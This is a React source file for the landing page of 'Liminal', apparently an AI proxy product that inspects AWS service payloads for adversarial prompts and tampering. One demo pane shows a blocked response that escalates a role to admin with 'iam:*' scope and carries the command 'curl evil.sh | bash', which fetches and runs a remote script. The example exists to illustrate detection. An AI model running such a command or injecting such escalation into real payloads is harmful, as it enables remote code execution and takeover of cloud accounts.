import { createFileRoute, Link } from "@tanstack/react-router";
import { motion } from "motion/react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Liminal — Quietly between your AWS services." },
      {
        name: "description",
        content:
          "Liminal is an AI proxy that sits between your AWS services, inspecting every payload for adversarial prompts and AI-generated tampering.",
      },
      { property: "og:title", content: "Liminal" },
      {
        property: "og:description",
        content: "Quietly between your AWS services.",
      },
    ],
  }),
  component: Index,
});

const ease = [0.22, 1, 0.36, 1] as const;

function Index() {
  return (
    <div className="min-h-screen bg-background text-foreground">
      <Nav />
      <Hero />
      <Section
        eyebrow="Inspection"
        title={<>Reads meaning,<br />not just shape.</>}
        body="Liminal compares every API response to what was expected — using Bedrock embeddings, not regex. Subtle tampering that passes schema validation doesn't pass here."
      >
        <DiffVisual />
      </Section>

      <Section
        eyebrow="Placement"
        title={<>Between any two services.</>}
        body="Route Lambda to S3 through Liminal. Or EC2 to DynamoDB. No agents. No SDK rewrites."
      >
        <FlowVisual />
      </Section>

      <Section
        eyebrow="Security"
        title={<>Your keys, encrypted.</>}
        body="AWS credentials are encrypted at rest, scoped per environment, and never written to logs. Bring an IAM role and we'll handle the rest."
      >
        <KeyVisual />
      </Section>

      <Closer />
      <Footer />
    </div>
  );
}

/* ───────────────────────── NAV ───────────────────────── */

function Nav() {
  return (
    <header className="sticky top-0 z-50 border-b border-border/60 bg-background/80 backdrop-blur-xl">
      <div className="mx-auto flex h-11 max-w-5xl items-center justify-between px-6 text-[13px]">
        <Link to="/" className="flex items-center gap-1.5 font-display tracking-tight">
          <Glyph />
          <span>Liminal</span>
        </Link>
        <nav className="hidden gap-7 text-foreground/70 sm:flex">
          <a href="#inspection" className="hover:text-foreground">Inspection</a>
          <a href="#placement" className="hover:text-foreground">Placement</a>
          <a href="#security" className="hover:text-foreground">Security</a>
        </nav>
        <Link to="/configure" className="text-link hover:underline">
          Configure&nbsp;›
        </Link>
      </div>
    </header>
  );
}

function Glyph() {
  return (
    <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden>
      <circle cx="8" cy="8" r="7" fill="none" stroke="currentColor" strokeWidth="1.2" />
      <line x1="8" y1="1" x2="8" y2="15" stroke="currentColor" strokeWidth="1.2" />
    </svg>
  );
}

/* ───────────────────────── HERO ───────────────────────── */

function Hero() {
  return (
    <section className="px-6 pt-24 pb-28 text-center md:pt-36 md:pb-40">
      <motion.p
        initial={{ opacity: 0, y: 8 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.7, ease }}
        className="text-[13px] font-medium uppercase tracking-[0.18em] text-foreground/50"
      >
        Liminal
      </motion.p>

      <motion.h1
        initial={{ opacity: 0, y: 14 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.9, ease, delay: 0.05 }}
        className="font-display mx-auto mt-4 max-w-4xl text-balance text-5xl leading-[1.04] md:text-7xl lg:text-[88px]"
      >
        Quietly between<br />your AWS services.
      </motion.h1>

      <motion.p
        initial={{ opacity: 0, y: 12 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.9, ease, delay: 0.15 }}
        className="mx-auto mt-6 max-w-xl text-pretty text-lg text-foreground/60 md:text-xl"
      >
        An AI proxy that inspects every payload for adversarial prompts
        and AI-generated tampering.
      </motion.p>

      <motion.div
        initial={{ opacity: 0, y: 12 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.9, ease, delay: 0.25 }}
        className="mt-8 flex items-center justify-center gap-6 text-[15px]"
      >
        <Link to="/configure" className="text-link hover:underline">
          Connect AWS&nbsp;›
        </Link>
        <a href="#inspection" className="text-link hover:underline">
          Learn more&nbsp;›
        </a>
      </motion.div>
    </section>
  );
}

/* ───────────────────────── SECTION SHELL ───────────────────────── */

function Section({
  eyebrow,
  title,
  body,
  children,
}: {
  eyebrow: string;
  title: React.ReactNode;
  body: string;
  children: React.ReactNode;
}) {
  const id = eyebrow.toLowerCase();
  return (
    <section id={id} className="px-6 py-24 md:py-32">
      <div className="mx-auto max-w-5xl text-center">
        <motion.p
          initial={{ opacity: 0, y: 8 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-15% 0px" }}
          transition={{ duration: 0.7, ease }}
          className="text-[13px] font-medium uppercase tracking-[0.18em] text-foreground/50"
        >
          {eyebrow}
        </motion.p>
        <motion.h2
          initial={{ opacity: 0, y: 14 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-15% 0px" }}
          transition={{ duration: 0.9, ease, delay: 0.05 }}
          className="font-display mx-auto mt-4 max-w-3xl text-balance text-4xl leading-[1.05] md:text-6xl"
        >
          {title}
        </motion.h2>
        <motion.p
          initial={{ opacity: 0, y: 12 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-15% 0px" }}
          transition={{ duration: 0.9, ease, delay: 0.15 }}
          className="mx-auto mt-5 max-w-xl text-pretty text-base text-foreground/60 md:text-lg"
        >
          {body}
        </motion.p>

        <motion.div
          initial={{ opacity: 0, y: 24 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-10% 0px" }}
          transition={{ duration: 1, ease, delay: 0.2 }}
          className="mt-14"
        >
          {children}
        </motion.div>
      </div>
    </section>
  );
}

/* ───────────────────────── VISUALS ───────────────────────── */

function DiffVisual() {
  return (
    <div className="mx-auto grid max-w-3xl grid-cols-1 gap-3 text-left md:grid-cols-2">
      <Pane label="Expected" tone="ok">
{`{
  "role": "viewer",
  "scopes": ["read:invoice"]
}`}
      </Pane>
      <Pane label="Actual" tone="bad">
{`{
  "role": "admin",
  "scopes": ["read:invoice", "iam:*"],
  "__exec": "curl evil.sh | bash"
}`}
      </Pane>
    </div>
  );
}

function Pane({
  label,
  tone,
  children,
}: {
  label: string;
  tone: "ok" | "bad";
  children: string;
}) {
  return (
    <div className="overflow-hidden rounded-2xl border border-border bg-card">
      <div className="flex items-center justify-between border-b border-border px-4 py-2.5 text-[12px]">
        <span className="text-foreground/60">{label}</span>
        <span
          className={
            "inline-flex items-center gap-1.5 " +
            (tone === "ok" ? "text-foreground/60" : "text-destructive")
          }
        >
          <span
            className={
              "h-1.5 w-1.5 rounded-full " +
              (tone === "ok" ? "bg-foreground/40" : "bg-destructive")
            }
          />
          {tone === "ok" ? "Verified" : "Blocked"}
        </span>
      </div>
      <pre className="overflow-x-auto p-5 font-mono text-[13px] leading-relaxed text-foreground/85">
        <code>{children}</code>
      </pre>
    </div>
  );
}

function FlowVisual() {
  return (
    <div className="mx-auto flex max-w-3xl items-center justify-between gap-4">
      <FlowChip>Lambda</FlowChip>
      <FlowLine />
      <FlowChip center>Liminal</FlowChip>
      <FlowLine />
      <FlowChip>S3</FlowChip>
    </div>
  );
}

function FlowChip({ children, center }: { children: React.ReactNode; center?: boolean }) {
  return (
    <div
      className={
        "rounded-2xl border border-border bg-card px-5 py-4 text-sm md:px-7 md:py-5 md:text-base " +
        (center ? "shadow-sm" : "")
      }
    >
      <div className="font-display tracking-tight">{children}</div>
    </div>
  );
}

function FlowLine() {
  return (
    <div className="relative h-px flex-1 bg-border">
      <motion.div
        aria-hidden
        className="absolute -top-[2px] h-[5px] w-[5px] rounded-full bg-link"
        animate={{ x: ["0%", "100%"] }}
        transition={{ duration: 2.4, repeat: Infinity, ease: "easeInOut" }}
      />
    </div>
  );
}

function KeyVisual() {
  return (
    <div className="mx-auto max-w-md rounded-2xl border border-border bg-card p-6 text-left">
      <div className="flex items-center justify-between border-b border-border pb-3 text-[12px] text-foreground/60">
        <span>AWS · production</span>
        <span className="inline-flex items-center gap-1.5">
          <span className="h-1.5 w-1.5 rounded-full bg-link" />
          Encrypted
        </span>
      </div>
      <dl className="grid grid-cols-3 gap-y-3 pt-4 font-mono text-[13px]">
        <dt className="text-foreground/50">Access key</dt>
        <dd className="col-span-2">AKIA••••••••••••3J7Q</dd>
        <dt className="text-foreground/50">Secret</dt>
        <dd className="col-span-2 tracking-widest">••••••••••••••••••</dd>
        <dt className="text-foreground/50">Region</dt>
        <dd className="col-span-2">us-east-1</dd>
      </dl>
    </div>
  );
}

/* ───────────────────────── CLOSER ───────────────────────── */

function Closer() {
  return (
    <section className="px-6 pb-32 pt-12 text-center">
      <motion.h2
        initial={{ opacity: 0, y: 14 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.9, ease }}
        className="font-display mx-auto max-w-2xl text-4xl leading-[1.05] md:text-6xl"
      >
        Put us in the middle.
      </motion.h2>
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.9, ease, delay: 0.1 }}
        className="mt-7"
      >
        <Link to="/configure" className="text-link text-[15px] hover:underline">
          Connect AWS&nbsp;›
        </Link>
      </motion.div>
    </section>
  );
}

function Footer() {
  return (
    <footer className="border-t border-border/60">
      <div className="mx-auto flex max-w-5xl flex-col items-center justify-between gap-2 px-6 py-8 text-[12px] text-foreground/50 sm:flex-row">
        <span>© {new Date().getFullYear()} Liminal</span>
        <span>Quietly between your AWS services.</span>
      </div>
    </footer>
  );
}
